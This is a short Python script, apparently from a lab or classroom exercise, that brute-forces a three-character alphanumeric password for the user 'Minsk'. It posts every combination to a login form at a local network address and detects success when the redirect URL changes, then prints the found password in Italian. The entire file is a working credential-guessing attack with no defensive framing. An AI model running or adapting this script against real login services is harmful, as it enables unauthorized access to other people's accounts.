from tkinter import N
import requests
import string
import sys
n="0123456789"
s=string.ascii_uppercase+string.ascii_lowercase+n 

for i in s:
    for j in s:
        for k in s:
            password=i+j+k
            data={"username": "Minsk",
                "password": password,
                 "log_in":"log_in"}
            r= requests.post('http://192.168.0.126:5000/', data=data)
            if 'http://192.168.0.126:5000/'!= r.url:
                print(f'la password trovata e: {password}')
                sys.exit()
    
    
        
            
